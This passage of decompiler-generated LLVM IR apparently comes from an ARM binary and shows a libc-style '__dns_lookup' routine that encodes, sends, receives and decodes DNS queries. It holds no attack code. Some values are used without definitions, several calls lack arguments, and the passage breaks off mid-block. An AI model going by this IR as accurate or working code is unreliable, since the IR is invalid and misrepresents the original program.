  %v1_18d5c = inttoptr i32 %v0_18d98 to i8*
  %v2_18d5c = load i8, i8* %v1_18d5c, align 1
  %v3_18d5c = zext i8 %v2_18d5c to i32
  %v2_18d60 = mul nuw nsw i32 %v3_18d5c, 2
  %v2_18d64 = add i32 %v2_18d60, %v2_18d28.pre
  %v3_18d68 = inttoptr i32 %v2_18d64 to i8*
  %v4_18d68 = load i8, i8* %v3_18d68, align 1
  %v6_18d68 = zext i8 %v4_18d68 to i32
  %v1_18d74 = and i32 %v6_18d68, 8
  %v2_18d74 = icmp eq i32 %v1_18d74, 0
  br i1 %v2_18d74, label %dec_label_pc_18d7c, label %dec_label_pc_18d44

dec_label_pc_18d7c:                               ; preds = %dec_label_pc_18d5c
  %v8_18d80 = icmp sgt i32 %v0_18dac, 3
  br i1 %v8_18d80, label %dec_label_pc_18d94, label %dec_label_pc_18d84

dec_label_pc_18d84:                               ; preds = %dec_label_pc_18d7c
  %v7_18d84 = icmp eq i8 %v2_18d5c, 46
  br i1 %v7_18d84, label %dec_label_pc_18d8c, label %dec_label_pc_18de8

dec_label_pc_18d8c:                               ; preds = %dec_label_pc_18d84
  %v1_18d8c = add i32 %v0_18d98, 1
  store i32 %v1_18d8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18da8

dec_label_pc_18d94:                               ; preds = %dec_label_pc_18d7c
  %v2_18d94 = icmp eq i8 %v2_18d5c, 0
  %v1_18d98 = add i32 %v0_18d98, 1
  store i32 %v1_18d98, i32* %r0.global-to-local, align 4
  br i1 %v2_18d94, label %dec_label_pc_18da8, label %dec_label_pc_18da0

dec_label_pc_18da0:                               ; preds = %dec_label_pc_18d94
  %v1_18da0 = and i32 %v6_18d68, 32
  %v2_18da0 = icmp eq i32 %v1_18da0, 0
  br i1 %v2_18da0, label %dec_label_pc_18de8, label %dec_label_pc_18da8

dec_label_pc_18da8:                               ; preds = %dec_label_pc_18da0, %dec_label_pc_18d94, %dec_label_pc_18d8c
  %v0_18d2c25 = phi i32 [ %v1_18d98, %dec_label_pc_18da0 ], [ %v1_18d98, %dec_label_pc_18d94 ], [ %v1_18d8c, %dec_label_pc_18d8c ]
  %v4_18da8 = mul i32 %v1_18da8, 256
  %v5_18da8 = or i32 %v0_18da8, %v4_18da8
  %v1_18dac = add nuw nsw i32 %v0_18dac, 1
  %v7_18db4 = icmp slt i32 %v1_18dac, 5
  br i1 %v7_18db4, label %dec_label_pc_18d24, label %dec_label_pc_18db8

dec_label_pc_18d24.lr.ph:                         ; preds = %entry
  %v2_18d28.pre = load i32, i32* @global_var_2b898, align 4
  br label %dec_label_pc_18d24

dec_label_pc_18db8:                               ; preds = %dec_label_pc_18da8
  %v2_18db8 = icmp eq i32 %arg2, 0
  br i1 %v2_18db8, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_18db8
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_18db8
  %v3_18dd4 = call i32 @llvm.bswap.i32(i32 %v5_18da8)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_18de0 = inttoptr i32 %arg2 to i32*
  store i32 %v3_18dd4, i32* %v3_18de0, align 4
  %v2_18de4.pre = load i32, i32* %stack_var_-20, align 4
  %v17_18de4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_18de4 = phi i32 [ 1, %bb ], [ %v17_18de4.pre, %bb41 ]
  %v2_18de4 = phi i32 [ %v3_18d0c, %bb ], [ %v2_18de4.pre, %bb41 ]
  store i32 %v2_18de4, i32* @r4, align 4
  ret i32 %v17_18de4

dec_label_pc_18de8:                               ; preds = %dec_label_pc_18d84, %dec_label_pc_18da0, %dec_label_pc_18d24, %dec_label_pc_18d44, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_18d0c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_18d28.pre, { 2, 1, 0 }
  uselistorder i32 %v1_18dac, { 1, 0 }
  uselistorder i32 %v0_18d98, { 0, 1, 3, 2 }
  uselistorder i32 %v3_18d0c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_18de8, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_18d5c, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_18df4 = load i32, i32* @r4, align 4
  %v6_18df4 = load i32, i32* @r5, align 4
  %v9_18df4 = load i32, i32* @r6, align 4
  %v12_18df4 = load i32, i32* @r7, align 4
  %v15_18df4 = load i32, i32* @r8, align 4
  %v18_18df4 = load i32, i32* @sb, align 4
  %v21_18df4 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_18e14 = call i32 @malloc(i32 512)
  store i32 %v1_18e14, i32* @r7, align 4
  %v1_18e20 = call i32 @malloc(i32 1025)
  %v2_18e24 = icmp eq i32 %v1_18e20, 0
  br i1 %v2_18e24, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_18e28 = load i32, i32* @r7, align 4
  %v3_18e28 = icmp eq i32 %v1_18e28, 0
  store i32 %v1_18e20, i32* %stack_var_-236, align 4
  br i1 %v3_18e28, label %bb195, label %dec_label_pc_18e3c

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1951c

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1951c

dec_label_pc_18e3c:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_18e40 = icmp eq i32 %arg3, 0
  br i1 %v2_18e40, label %dec_label_pc_1951c, label %dec_label_pc_18e48

dec_label_pc_18e48:                               ; preds = %dec_label_pc_18e3c
  %v2_18e4c = load i8, i8* %arg1, align 1
  %v2_18e50 = icmp eq i8 %v2_18e4c, 0
  br i1 %v2_18e50, label %dec_label_pc_1951c, label %dec_label_pc_18e58

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e48
  %v3_18e5c = call i32 @strlen(i8* nonnull %arg1)
  %v2_18e64 = add i32 %v3_18e5c, %tmp
  %v1_18e68 = add i32 %v2_18e64, -1
  %v2_18e68 = inttoptr i32 %v1_18e68 to i8*
  %v3_18e68 = load i8, i8* %v2_18e68, align 1
  %v2_18e6c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_18e6c, i32* @r4, align 4
  %v7_18e70 = icmp eq i8 %v3_18e68, 46
  %. = zext i1 %v7_18e70 to i32
  store i32 ptrtoint (i32* @global_var_301dc.926 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_18e6c, i32* @r0, align 4
  %v1_18e94 = call i32 @__pthread_cleanup_push_defer()
  %v2_18ea4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_301dc.926 to i32))
  %v2_18eb0 = load i32, i32* @global_var_301f4.931, align 4
  %v2_18eb4 = srem i32 %v2_18eb0, %arg3
  %v3_18ebc = load i8, i8* @global_var_2b8bd.934, align 1
  %v4_18ebc = zext i8 %v3_18ebc to i32
  %v2_18ec0 = load i8, i8* bitcast (i8** @global_var_2b8bc.933 to i8*), align 4
  %v3_18ec0 = zext i8 %v2_18ec0 to i32
  store i32 1, i32* @r1, align 4
  %v4_18ec8 = mul nuw nsw i32 %v4_18ebc, 256
  %v5_18ec8 = or i32 %v3_18ec0, %v4_18ec8
  store i32 %v5_18ec8, i32* @sb, align 4
  store i32 %v2_18eb4, i32* @sl, align 4
  store i32 %v2_18e6c, i32* @r0, align 4
  store i32 102112, i32* @lr, align 4
  %v1_18edc = call i32 @__pthread_cleanup_pop_restore()
  %v0_18ee8 = load i32, i32* @r5, align 4
  %v2_18f08 = ptrtoint i8* %stack_var_-188 to i32
  %v6_18f4c = bitcast i8* %stack_var_-188 to i32*
  %v2_1902c = ptrtoint i32* %stack_var_-92 to i32
  %v2_190bc = ptrtoint i8* %stack_var_-100 to i32
  %v3_19128 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_19474 = icmp eq i1 %v7_18e70, false
  %v7_1917c = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_19260 = ptrtoint i32* %stack_var_-140 to i32
  %v9_19358 = icmp eq i32 %tmp147, %arg2
  %v7_192ec = icmp eq i32 %arg2, 1
  %v2_19294 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_18ee8, 3
  br i1 %tmp292, label %dec_label_pc_18ef0.lr.ph.preheader.lr.ph, label %dec_label_pc_19528

dec_label_pc_18ef0.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_18e58
  %v2_19200 = icmp eq i32 %tmp156, 0
  %v8_192f0 = icmp eq i32 %arg2, 28
  br label %dec_label_pc_18ef0.lr.ph.preheader

dec_label_pc_18ef0:                               ; preds = %dec_label_pc_18ef0.lr.ph, %dec_label_pc_1950c.backedge
  %v1_18ef8 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_18ef0.lr.ph ], [ %v0_190a0, %dec_label_pc_1950c.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_18ef0.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_1950c.backedge ]
  %v7_18ef4 = icmp eq i32 %v1_18ef8, -1
  br i1 %v7_18ef4, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_18ef0
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_18ef0, %bb199
  %v1_18efc = xor i1 %v7_18ef4, true
  call void @__pseudo_cond_branch(i1 %v1_18efc, i32 ptrtoint (i32* @global_var_10014.867 to i32))
  store i32 0, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  store i32 %v2_18f08, i32* @r4, align 4
  %v0_18f0c = load i32, i32* @r7, align 4
  store i32 %v0_18f0c, i32* @r0, align 4
  %v0_18f10 = call i32 @__GI_memset()
  store i32 0, i32* @r1, align 4
  store i32 48, i32* @r2, align 4
  store i32 %v2_18f08, i32* @r0, align 4
  %v0_18f20 = call i32 @__GI_memset()
  %v0_18f24 = load i32, i32* @sb, align 4
  %v1_18f24 = add i32 %v0_18f24, 1
  %v3_18f2c = urem i32 %v1_18f24, 65536
  store i32 %v3_18f2c, i32* @sb, align 4
  %v0_18f38 = load i32, i32* @r7, align 4
  %v5_18f44 = trunc i32 %v1_18f24 to i8
  store i8 %v5_18f44, i8* %stack_var_-188, align 1
  %v7_18f4c = call i32 @__encode_header(i32* %v6_18f4c, i32 %v0_18f38, i32 512, i32 1, i32 %v1_18f24)
  store i32 %v7_18f4c, i32* @r5, align 4
  %v1_18f50 = icmp slt i32 %v7_18f4c, 0
  br i1 %v1_18f50, label %dec_label_pc_19528, label %dec_label_pc_18f58

dec_label_pc_18f58:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_18f60 = load i32, i32* %stack_var_-236, align 4
  %v4_18f64 = call i32 @strncpy(i32 %v2_18f60, i32 %tmp, i32 1025)
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_18e6c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2b8c0.676 to i32), i32* @r2, align 4
  %v1_18f7c = call i32 @__pthread_cleanup_push_defer()
  %v2_18f8c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b8c0.676 to i32))
  %v1_18f9c = load i32, i32* @sl, align 4
  %v4_18f9c = mul i32 %v1_18f9c, 4
  %v5_18f9c = add i32 %v4_18f9c, %arg4
  %v6_18f9c = inttoptr i32 %v5_18f9c to i32*
  %v7_18f9c = load i32, i32* %v6_18f9c, align 4
  store i32 %v7_18f9c, i32* @r6, align 4
  br i1 %v1_18f98, label %dec_label_pc_18fe0, label %dec_label_pc_18fa4

dec_label_pc_18fa4:                               ; preds = %dec_label_pc_18f58
  %v2_18fac = load i32, i32* @global_var_30334.938, align 4
  %v6_18fb4 = icmp slt i32 %v6_194d0, %v2_18fac
  br i1 %v6_18fb4, label %dec_label_pc_18fb8, label %dec_label_pc_18fe0

dec_label_pc_18fb8:                               ; preds = %dec_label_pc_18fa4
  store i32 ptrtoint (i32* @global_var_1e9d0.940 to i32), i32* @r1, align 4
  %v2_18fc0 = load i32, i32* %stack_var_-236, align 4
  %v4_18fc4 = inttoptr i32 %v2_18fc0 to i8*
  %v5_18fc4 = call i32 @__GI_strncat(i8* %v4_18fc4, i32 ptrtoint (i32* @global_var_1e9d0.940 to i32), i32 1025, i32 %v2_18fac)
  %v7_18fd4 = load i32, i32* %v6_18fd4, align 4
  store i32 %v7_18fd4, i32* @r1, align 4
  %v4_18fdc = inttoptr i32 %v2_18fc0 to i8*
  %v5_18fdc = call i32 @__GI_strncat(i8* %v4_18fdc, i32 %v7_18fd4, i32 1025, i32 ptrtoint (i32* @global_var_30314.942 to i32))
  br label %dec_label_pc_18fe0

dec_label_pc_18fe0:                               ; preds = %dec_label_pc_18fa4, %dec_label_pc_18f58, %dec_label_pc_18fb8
  store i32 %v2_18e6c, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 102388, i32* @lr, align 4
  %v1_18ff0 = call i32 @__pthread_cleanup_pop_restore()
  %v2_18ffc = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_18ffc, i32* %stack_var_-56, align 4
  %v0_1900c = load i32, i32* @r7, align 4
  %v1_1900c = load i32, i32* @r5, align 4
  %v2_1900c = add i32 %v1_1900c, %v0_1900c
  %v1_19010 = sub i32 512, %v1_1900c
  %v8_19018 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_1900c, i32 %v1_19010, i32 %arg2, i32 %v2_18ffc, i32 %arg2, i32 1)
  store i32 %v8_19018, i32* @fp, align 4
  %v1_1901c = icmp slt i32 %v8_19018, 0
  br i1 %v1_1901c, label %dec_label_pc_19528, label %dec_label_pc_19024

dec_label_pc_19024:                               ; preds = %dec_label_pc_18fe0
  store i32 0, i32* @r4, align 4
  %v0_19034 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_19040 = inttoptr i32 %v0_19034 to i8*
  %v4_19040 = call i32 @inet_pton(i32 10, i8* %v3_19040, i32 %v2_1902c)
  %v1_19044 = load i32, i32* @r4, align 4
  %v7_19048 = icmp sgt i32 %v4_19040, %v1_19044
  br i1 %v7_19048, label %bb201, label %dec_label_pc_19024..thread11_crit_edge

dec_label_pc_19024..thread11_crit_edge:           ; preds = %dec_label_pc_19024
  %v3_19054.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_19024
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_19024..thread11_crit_edge, %bb201
  %v3_19054 = phi i8 [ %v3_19054.pre, %dec_label_pc_19024..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_19054 = sext i8 %v3_19054 to i32
  %v8_19050.op = urem i32 %v1_19044, 256
  %v8_19050.op.op = mul nuw nsw i32 %v8_19050.op, 256
  %v4_1905c = select i1 %v7_19048, i32 %v8_19050.op.op, i32 0
  %v5_1905c = or i32 %v4_19054, %v4_1905c
  %v7_19060 = icmp eq i32 %v5_1905c, 10
  br i1 %v7_19060, label %dec_label_pc_1908c, label %dec_label_pc_19074

dec_label_pc_19074:                               ; preds = %.thread11
  %v0_19078 = load i32, i32* @r6, align 4
  store i32 %v0_19078, i32* @r0, align 4
  %v1_19084 = call i32 @inet_addr(i32 %v0_19078)
  br label %dec_label_pc_1908c

dec_label_pc_1908c:                               ; preds = %.thread11, %dec_label_pc_19074
  %v0_190a0 = call i32 @socket()
  store i32 %v0_190a0, i32* @r0, align 4
  %v1_190a4 = icmp slt i32 %v0_190a0, 0
  br i1 %v1_190a4, label %.thread, label %dec_label_pc_190bc

.thread:                                          ; preds = %dec_label_pc_1908c
  br label %dec_label_pc_1950c.backedge

dec_label_pc_1950c.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_18ef0, label %dec_label_pc_19528

dec_label_pc_190bc:                               ; preds = %dec_label_pc_1908c
  store i32 %v2_190bc, i32* @r1, align 4
  store i32 28, i32* @r2, align 4
  %v3_190c4 = call i32 @__libc_connect(i32 %v0_190a0, i32 %v2_190bc, i32 28)
  %v1_190c8 = icmp slt i32 %v3_190c4, 0
  br i1 %v1_190c8, label %dec_label_pc_190d0, label %dec_label_pc_190f0

dec_label_pc_190d0:                               ; preds = %dec_label_pc_190bc
  %v0_190d0 = call i32 @__errno_location()
  %v1_190d4 = inttoptr i32 %v0_190d0 to i32*
  %v2_190d4 = load i32, i32* %v1_190d4, align 4
  %v7_190d8 = icmp eq i32 %v2_190d4, 101
  br i1 %v7_190d8, label %dec_label_pc_1943c, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_190d0
  br label %dec_label_pc_1950c.backedge

dec_label_pc_190f0:                               ; preds = %dec_label_pc_190bc
  %v0_190f0 = load i32, i32* @r5, align 4
  %v1_190f0 = load i32, i32* @fp, align 4
  %v2_190f0 = add i32 %v1_190f0, %v0_190f0
  store i32 %v2_190f0, i32* @r2, align 4
  %v0_190f4 = load i32, i32* @r7, align 4
  store i32 %v0_190f4, i32* @r1, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v0_190a0, i32* @r0, align 4
  %v4_19100 = call i32 @__libc_send(i32 %v0_190a0, i32 %v0_190f4, i32 %v2_190f0, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_190a0, i32* %stack_var_-44, align 4
  %v4_19128 = call i32 @__libc_poll(%pollfd* %v3_19128, i32 1, i32 10000)
  %v1_1912c = load i32, i32* @r4, align 4
  %v7_19130 = icmp sgt i32 %v4_19128, %v1_1912c
  br i1 %v7_19130, label %dec_label_pc_19134, label %dec_label_pc_1943c

dec_label_pc_19134:                               ; preds = %dec_label_pc_190f0
  store i32 %v1_1912c, i32* @r3, align 4
  store i32 %v0_190a0, i32* @r0, align 4
  %v0_1913c = load i32, i32* @r7, align 4
  store i32 %v0_1913c, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v4_19144 = call i32 @__libc_recv(i32 %v0_190a0, i32 %v0_1913c, i32 512, i32 %v1_1912c)
  store i32 %v4_19144, i32* @fp, align 4
  %v7_19150 = icmp slt i32 %v4_19144, 12
  br i1 %v7_19150, label %dec_label_pc_19470, label %dec_label_pc_19154

dec_label_pc_19154:                               ; preds = %dec_label_pc_19134
  %v0_19154 = load i32, i32* @r7, align 4
  %v2_1915c = inttoptr i32 %v0_19154 to i8*
  %v3_1915c = call i32 @__decode_header(i8* %v2_1915c, i32 %v2_18f08)
  %v3_19160 = load i8, i8* %stack_var_-188, align 1
  %v4_19160 = sext i8 %v3_19160 to i32
  store i32 %v4_19160, i32* @r6, align 4
  %v1_19164 = load i32, i32* @sb, align 4
  %v9_19164 = icmp eq i32 %v4_19160, %v1_19164
  br i1 %v9_19164, label %dec_label_pc_1916c, label %dec_label_pc_19470

dec_label_pc_1916c:                               ; preds = %dec_label_pc_19154
  %v1_19170 = load i32, i32* @r4, align 4
  %v9_19170 = icmp eq i32 %tmp157, %v1_19170
  br i1 %v9_19170, label %dec_label_pc_19470, label %dec_label_pc_19178

dec_label_pc_19178:                               ; preds = %dec_label_pc_1916c
  br i1 %v7_1917c, label %dec_label_pc_19184, label %dec_label_pc_19200

dec_label_pc_19184:                               ; preds = %dec_label_pc_19178
  %v9_19188 = icmp eq i32 %., %v1_19170
  br i1 %v9_19188, label %dec_label_pc_19190, label %dec_label_pc_191f4

dec_label_pc_19190:                               ; preds = %dec_label_pc_19184
  store i32 %v2_18e6c, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2b8c0.676 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_18e6c, i32* @r0, align 4
  %v1_191a8 = call i32 @__pthread_cleanup_push_defer()
  %v2_191b8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b8c0.676 to i32))
  store i32 %v2_18e6c, i32* @r0, align 4
  %v2_191c4 = load i32, i32* @global_var_30334.938, align 4
  store i32 %v2_191c4, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 102872, i32* @lr, align 4
  %v1_191d4 = call i32 @__pthread_cleanup_pop_restore()
  %v0_191dc = load i32, i32* @r4, align 4
  %v1_191dc = add i32 %v0_191dc, -1
  store i32 %v1_191dc, i32* @r4, align 4
  %v5_191e4 = icmp slt i32 %v6_194d0, %v1_191dc
  br i1 %v5_191e4, label %.thread19, label %dec_label_pc_191f4

.thread19:                                        ; preds = %dec_label_pc_19190
  %v7_191e4 = add i32 %v6_194d0, 1
  %v6_191e8 = load i32, i32* @r6, align 4
  store i32 %v6_191e8, i32* @sb, align 4
  br label %dec_label_pc_1950c.outer.backedge

dec_label_pc_191f4:                               ; preds = %dec_label_pc_19190, %dec_label_pc_19184
  %v0_191f4 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_19224

dec_label_pc_19200:                               ; preds = %dec_label_pc_19178
  br i1 %v2_19200, label %dec_label_pc_19208, label %dec_label_pc_19470

dec_label_pc_19208:                               ; preds = %dec_label_pc_19200
  br i1 %tmp198, label %dec_label_pc_1921c, label %dec_label_pc_19234.preheader

dec_label_pc_19234.preheader:                     ; preds = %dec_label_pc_19208
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_19234

dec_label_pc_1921c:                               ; preds = %dec_label_pc_19208
  %v0_1921c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_19224

dec_label_pc_19224:                               ; preds = %dec_label_pc_191f4, %dec_label_pc_1921c
  %storemerge4 = phi i32 [ %v0_1921c, %dec_label_pc_1921c ], [ %v0_191f4, %dec_label_pc_191f4 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1921c ], [ 1, %dec_label_pc_191f4 ]
  %v2_19224 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_19224, align 4
  br label %dec_label_pc_19538

dec_label_pc_1922c:                               ; preds = %dec_label_pc_19234
  %v2_1922c = call i32 @__length_question(i32 %v0_19240, i32 %v0_1923c)
  %v0_19230 = load i32, i32* @r5, align 4
  %v2_19230 = add i32 %v0_19230, %v2_1922c
  store i32 %v2_19230, i32* @r5, align 4
  %v0_19238.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19234

dec_label_pc_19234:                               ; preds = %dec_label_pc_19234.preheader, %dec_label_pc_1922c
  %v0_1923c = phi i32 [ 12, %dec_label_pc_19234.preheader ], [ %v2_19230, %dec_label_pc_1922c ]
  %v0_19244 = phi i32 [ 0, %dec_label_pc_19234.preheader ], [ %v0_19238.pre, %dec_label_pc_1922c ]
  store i32 %v0_1923c, i32* @r1, align 4
  %v0_19240 = load i32, i32* @r7, align 4
  store i32 %v0_19240, i32* @r0, align 4
  %v1_19244 = add i32 %v0_19244, 1
  store i32 %v1_19244, i32* @r4, align 4
  %v5_19248 = icmp slt i32 %v0_19244, 1
  br i1 %v5_19248, label %dec_label_pc_1922c, label %dec_label_pc_1924c

dec_label_pc_1924c:                               ; preds = %dec_label_pc_19234
  br label %dec_label_pc_193a8

dec_label_pc_19260:                               ; preds = %bb205
  store i32 %v2_19260, i32* @r4, align 4
  %v0_19264 = load i32, i32* @r7, align 4
  %v0_1926c = load i32, i32* @fp, align 4
  %v5_19274 = call i32 @__decode_answer(i32 %v0_19264, i32 %v0_19268, i32 %v0_1926c, i32* nonnull %stack_var_-140)
  %v1_19278 = icmp slt i32 %v5_19274, 0
  br i1 %v1_19278, label %dec_label_pc_19284, label %dec_label_pc_192a0

dec_label_pc_19284:                               ; preds = %dec_label_pc_19260
  %v2_19288 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_19288, label %dec_label_pc_19470, label %dec_label_pc_19290

dec_label_pc_19290:                               ; preds = %dec_label_pc_19284
  br i1 %v2_19294, label %dec_label_pc_19470, label %dec_label_pc_193bc

dec_label_pc_192a0:                               ; preds = %dec_label_pc_19260
  %v2_192a4 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_192a4, label %dec_label_pc_19348, label %dec_label_pc_192ac

dec_label_pc_192ac:                               ; preds = %dec_label_pc_192a0
  %v0_192ac = load i32, i32* @r8, align 4
  %v6_192b0 = add i32 %v0_192ac, 36
  %v7_192b0 = inttoptr i32 %v6_192b0 to i32*
  %v8_192b0 = load i32, i32* %v7_192b0, align 4
  store i32 %v8_192b0, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_19260, i32* @r1, align 4
  store i32 %v0_192ac, i32* @r0, align 4
  %v0_192cc = call i32 @memcpy()
  %v0_192d0 = load i32, i32* @r8, align 4
  %v1_192d0 = add i32 %v0_192d0, 4
  %v2_192d0 = inttoptr i32 %v1_192d0 to i32*
  %v3_192d0 = load i32, i32* %v2_192d0, align 4
  %v7_192d4 = icmp eq i32 %v3_192d0, 24
  br i1 %v7_192d4, label %dec_label_pc_192f8, label %dec_label_pc_192dc

dec_label_pc_192dc:                               ; preds = %dec_label_pc_192ac
  %v1_192dc = add i32 %v0_192d0, 28
  %v2_192dc = inttoptr i32 %v1_192dc to i32*
  %v3_192dc = load i32, i32* %v2_192dc, align 4
  %v2_192e0 = icmp eq i32 %v3_192dc, 0
  br i1 %v2_192e0, label %dec_label_pc_193bc, label %dec_label_pc_192e8

dec_label_pc_192e8:                               ; preds = %dec_label_pc_192dc
  br i1 %v7_192ec, label %dec_label_pc_192f8, label %bb203

bb203:                                            ; preds = %dec_label_pc_192e8
  br i1 %v8_192f0, label %dec_label_pc_192f8, label %dec_label_pc_193bc

dec_label_pc_192f8:                               ; preds = %dec_label_pc_192e8, %bb203, %dec_label_pc_192ac
  %v9_192fc = icmp eq i32 %v3_192d0, %arg2
  br i1 %v9_192fc, label %dec_label_pc_19310, label %dec_label_pc_19304

dec_label_pc_19304:                               ; preds = %dec_label_pc_192f8
  %v1_19304 = inttoptr i32 %v0_192d0 to i32*
  %v2_19304 = load i32, i32* %v1_19304, align 4
  store i32 %v2_19304, i32* @r0, align 4
  %v0_19308 = call i32 @free()
  br label %dec_label_pc_19394

dec_label_pc_19310:                               ; preds = %dec_label_pc_192f8
  %v1_19318 = add i32 %v0_192d0, 16
  %v2_19318 = inttoptr i32 %v1_19318 to i32*
  %v3_19318 = load i32, i32* %v2_19318, align 4
  %v2_1931c = sub i32 %tmp155, %stack_var_-192.0
  %v1_19320 = add i32 %v2_1931c, -1
  %v1_19324 = add i32 %v3_19318, 4
  %v2_19328 = mul i32 %v1_19324, %v1_19320
  %v1_1932c = add i32 %v0_192d0, 32
  %v2_1932c = inttoptr i32 %v1_1932c to i32*
  %v3_1932c = load i32, i32* %v2_1932c, align 4
  %v2_19334 = add i32 %v0_192d0, 36
  %v3_19334 = inttoptr i32 %v2_19334 to i32*
  store i32 %v1_19320, i32* %v3_19334, align 4
  %tmp294 = icmp ugt i32 %v2_19328, %v3_1932c
  br i1 %tmp294, label %dec_label_pc_193bc, label %dec_label_pc_19310.dec_label_pc_19390_crit_edge

dec_label_pc_19310.dec_label_pc_19390_crit_edge:  ; preds = %dec_label_pc_19310
  %v1_19390.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_19390

dec_label_pc_19348:                               ; preds = %dec_label_pc_192a0
  %v3_19348 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_19348, i32* @r0, align 4
  %v0_1934c = call i32 @free()
  br i1 %v9_19358, label %dec_label_pc_19360, label %dec_label_pc_19394

dec_label_pc_19360:                               ; preds = %dec_label_pc_19348
  %v0_19360 = load i32, i32* @r8, align 4
  %v1_19360 = add i32 %v0_19360, 16
  %v2_19360 = inttoptr i32 %v1_19360 to i32*
  %v3_19360 = load i32, i32* %v2_19360, align 4
  %v9_19368 = icmp eq i32 %v3_19360, %tmp146
  br i1 %v9_19368, label %dec_label_pc_19370, label %dec_label_pc_19468

dec_label_pc_19370:                               ; preds = %dec_label_pc_19360
  %v1_19370 = add i32 %v0_19360, 36
  %v2_19370 = inttoptr i32 %v1_19370 to i32*
  %v3_19370 = load i32, i32* %v2_19370, align 4
  %v1_19374 = add i32 %v0_19360, 28
  %v2_19374 = inttoptr i32 %v1_19374 to i32*
  %v3_19374 = load i32, i32* %v2_19374, align 4
  %v3_19378 = mul i32 %v3_19370, %tmp146
